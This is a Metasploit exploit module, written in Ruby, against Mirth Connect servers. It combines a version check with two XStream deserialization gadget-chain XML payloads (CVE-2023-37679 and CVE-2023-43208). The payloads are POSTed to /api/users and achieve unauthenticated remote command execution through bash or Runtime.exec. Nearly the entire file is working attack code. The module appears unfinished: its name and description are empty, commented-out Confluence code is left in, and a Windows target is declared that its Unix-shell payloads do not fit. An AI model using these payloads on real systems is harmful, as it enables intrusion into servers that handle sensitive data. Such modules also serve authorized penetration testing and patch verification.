##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '',
        'Description' => %q{
        },
        'Author' => [
          'Naveen Sunkavally',
          'Spencer McIntyre'
        ],
        'References' => [
          ['CVE', '2023-37679'],
          ['URL', 'https://www.ihteam.net/advisory/mirth-connect/'],
          ['CVE', '2023-43208'],
          ['URL', 'https://www.horizon3.ai/nextgen-mirth-connect-remote-code-execution-vulnerability-cve-2023-43208/'],
          ['URL', 'https://www.horizon3.ai/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/'],
        ],
        'DisclosureDate' => '2023-10-25',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux', 'win'],
        'Arch' => [ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    target_version = get_target_version
    return CheckCode::Unknown unless target_version

    vprint_status("Detected target version: #{target_version}")

    if target_version <= Rex::Version.new('4.3.0')
      return CheckCode::Appears("Version #{target_version} is affected by CVE-2023-37679.")
    elsif target_version <= Rex::Version.new('4.4.0')
      return CheckCode::Appears("Version #{target_version} is affected by CVE-2023-43208.")
    end

    CheckCode::Safe("Version #{target_version} is not affected.")
  end

  def get_target_version
    return @target_version if @target_version

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/server/version'),
      'headers' => {
        'X-Requested-With' => 'OpenAPI'
      }
    )
    return nil unless res&.code == 200
    return nil unless res.body =~ /(\d+(\.\d+)*)/

    @target_version = Rex::Version.new(Regexp.last_match(1))
    @target_version
  end

  def exploit
    # confluence_platform = get_confluence_platform
    # unless confluence_platform
    #   fail_with(Failure::NotVulnerable, 'The target is not vulnerable.')
    # end
    #
    # unless confluence_platform.downcase.start_with?('win') == (target['Platform'] == 'win')
    #   fail_with(Failure::NoTarget, "The target platform '#{confluence_platform}' is incompatible with '#{target.name}'")
    # end

    target_version = get_target_version
    print_status("Executing #{payload_instance.refname} (#{target.name})")

    if target_version <= Rex::Version.new('4.3.0')
      execute_command_cve_2023_37679(payload.encoded)
    elsif target_version <= Rex::Version.new('4.4.0')
      execute_command_cve_2023_43208(payload.encoded)
    else
      fail_with(Failure::NoTarget, "Version #{target_version} is not vulnerable.")
    end
  end

  def execute_command_cve_2023_37679(cmd, _opts = {})
    xml = Nokogiri::XML(<<-XML, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <sorted-set>
        <string>foo</string>
        <dynamic-proxy>
          <interface>java.lang.Comparable</interface>
          <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="java.lang.ProcessBuilder">
              <command>
                <string>bash</string>
                <string>-c</string>
                <string>#{cmd.encode(xml: :text)}</string>
              </command>
            </target>
            <methodName>start</methodName>
            <eventTypes/>
          </handler>
        </dynamic-proxy>
      </sorted-set>
    XML

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api/users'),
      'ctype' => 'application/xml',
      'headers' => {
        'X-Requested-With' => 'OpenAPI'
      },
      'data' => xml
    })

    res&.code == 500
  end

  def execute_command_cve_2023_43208(cmd, _opts = {})
    xml = Nokogiri::XML(<<-XML, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <sorted-set>
        <string>#{rand_text_alphanumeric(4..12)}</string>
        <dynamic-proxy>
          <interface>java.lang.Comparable</interface>
          <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
              <iTransformers>
                <org.apache.commons.collections4.functors.ConstantTransformer>
                  <iConstant class="java-class">java.lang.Runtime</iConstant>
                </org.apache.commons.collections4.functors.ConstantTransformer>
                <org.apache.commons.collections4.functors.InvokerTransformer>
                  <iMethodName>getMethod</iMethodName>
                  <iParamTypes>
                    <java-class>java.lang.String</java-class>
                    <java-class>[Ljava.lang.Class;</java-class>
                  </iParamTypes>
                  <iArgs>
                    <string>getRuntime</string>
                    <java-class-array/>
                  </iArgs>
                </org.apache.commons.collections4.functors.InvokerTransformer>
                <org.apache.commons.collections4.functors.InvokerTransformer>
                  <iMethodName>invoke</iMethodName>
                  <iParamTypes>
                    <java-class>java.lang.Object</java-class>
                    <java-class>[Ljava.lang.Object;</java-class>
                  </iParamTypes>
                  <iArgs>
                    <null/>
                    <object-array/>
                  </iArgs>
                </org.apache.commons.collections4.functors.InvokerTransformer>
                <org.apache.commons.collections4.functors.InvokerTransformer>
                  <iMethodName>exec</iMethodName>
                  <iParamTypes>
                    <java-class>java.lang.String</java-class>
                  </iParamTypes>
                  <iArgs>
                    <string>sh -c $@|sh . echo #{cmd.encode(xml: :text)}</string>
                  </iArgs>
                </org.apache.commons.collections4.functors.InvokerTransformer>
              </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
              <string>compareTo</string>
            </eventTypes>
          </handler>
        </dynamic-proxy>
      </sorted-set>
    XML

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api/users'),
      'ctype' => 'application/xml',
      'headers' => {
        'X-Requested-With' => 'OpenAPI'
      },
      'data' => xml
    })

    res&.code == 500
  end
end
